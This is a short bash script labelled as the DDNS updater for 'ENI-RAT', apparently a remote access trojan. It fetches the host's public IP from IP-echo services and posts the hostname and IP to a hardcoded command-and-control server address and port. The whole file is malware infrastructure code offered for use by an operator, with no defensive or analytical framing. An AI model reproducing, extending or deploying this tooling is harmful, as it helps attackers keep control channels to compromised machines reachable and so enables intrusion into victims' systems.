#!/bin/bash
# ENI-RAT DDNS Updater
# Run this script to update your C2's public IP to your DDNS

C2_HOST="5.107.135.233"
C2_PORT=5000
HOSTNAME="$(hostname)-eni-c2"

# Get public IP
PUBLIC_IP=$(curl -s https://api.ipify.org 2>/dev/null)
if [ -z "$PUBLIC_IP" ]; then
    PUBLIC_IP=$(curl -s https://checkip.amazonaws.com 2>/dev/null)
fi

# Update DDNS on C2
curl -s -X POST "http://$C2_HOST:$C2_PORT/api/ddns/register" \
    -H "Content-Type: application/json" \
    -d '{"hostname":"'"$HOSTNAME"'","ip":"'"$PUBLIC_IP"'"}'

echo "[+] DDNS updated: $HOSTNAME -> $PUBLIC_IP"
